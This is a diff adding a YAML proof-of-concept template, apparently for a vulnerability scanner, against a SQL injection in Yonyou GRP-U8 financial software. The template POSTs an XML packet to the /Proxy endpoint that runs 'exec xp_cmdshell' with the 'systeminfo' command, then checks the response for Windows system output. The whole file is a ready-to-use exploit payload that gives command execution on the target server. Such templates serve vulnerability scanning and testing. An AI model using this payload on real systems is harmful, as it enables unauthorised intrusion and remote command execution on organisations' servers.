@@ -1,0 +1,19 @@
+id: poc-yaml-yy-GRP-U8-all-versions-sql
+info:
+  name: 用友-GRP-U8 全版本 sql 注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: GRP-U8
+requests:
+- method: POST
+  path: /Proxy
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION>
+    <NAME>AS_DataRequest</NAME><PARAMS><PARAM> <NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM>
+    <NAME>Data</NAME><DATA format="text">exec xp_cmdshell 'systeminfo'</DATA> </PARAM></PARAMS></R9FUNCTION></R9PACKET>
+  expression: status_code == 200 && contains(body,"Microsoft Windows") && contains(body,"pagefile.sys")
+    && duration > 3
+variables: {}
+transport: http
